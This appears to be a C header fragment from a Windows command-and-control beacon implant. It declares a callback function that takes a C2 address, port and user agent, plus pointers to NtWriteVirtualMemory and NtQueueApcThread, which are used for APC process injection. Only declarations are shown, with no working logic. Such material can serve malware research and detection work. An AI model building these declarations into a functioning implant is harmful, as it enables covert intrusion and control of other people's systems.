#define DATA_CMD_OUT 0x2000
#define DATA_CMD_PRO 0x3000

typedef void (WINAPI * RtlGetVersion_) (OSVERSIONINFOEXW *);

LPCWSTR* BeaconCallbackC2(
    LPCSTR CallbackAddress,
    INT CallbackPort,
    LPCSTR UserAgent,
    DWORD *OpCode,
    LPCSTR SendBuffer,
    DWORD SendOpCode,
    DWORD SendBufferSize
);

NTSTATUS(*NtWriteVirtualMemory)(
    HANDLE hProcess, 
    PVOID lpBaseAddress, 
    PVOID lpBuffer, 
    SIZE_T NumberOfBytesToRead, 
    PSIZE_T NumberOfBytesRead
);

NTSTATUS(*NtQueueApcThread)(
    HANDLE ThreadHandle,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID NormalContext,
    PVOID SystemArgument1,
    PVOID SystemArgument2 
);